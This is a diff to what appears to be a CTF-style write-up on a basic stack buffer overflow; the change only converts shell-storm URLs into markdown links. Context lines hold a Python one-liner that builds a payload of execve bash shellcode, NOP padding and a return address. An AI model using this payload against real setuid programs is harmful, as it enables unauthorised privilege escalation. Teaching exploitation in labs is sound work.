@@ -423,7 +423,7 @@ ubuntu@ubuntu:/tmp$ ./test
 Wanna Smash!?: 0xffffcfd0
 ```
 
-In our payload we then place the following shellcode: http://shell-storm.org/shellcode/files/shellcode-606.php
+In our payload we then place the following shellcode: [http://shell-storm.org/shellcode/files/shellcode-606.php](http://shell-storm.org/shellcode/files/shellcode-606.php)
 ```python
 python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffcfd0)"  > /tmp/var
 ```
@@ -455,7 +455,7 @@ References
 [RopEmporium - ret2win](https://ropemporium.com/challenge/ret2win.html)  
 [ELF x86 - Stack buffer overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1)  
 [Difference between Real User ID, Effective User ID and Saved User ID](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id)  
-http://shell-storm.org/shellcode/files/shellcode-606.php
+[http://shell-storm.org/shellcode/files/shellcode-606.php](http://shell-storm.org/shellcode/files/shellcode-606.php)
 
 Other Literature
 ---------------
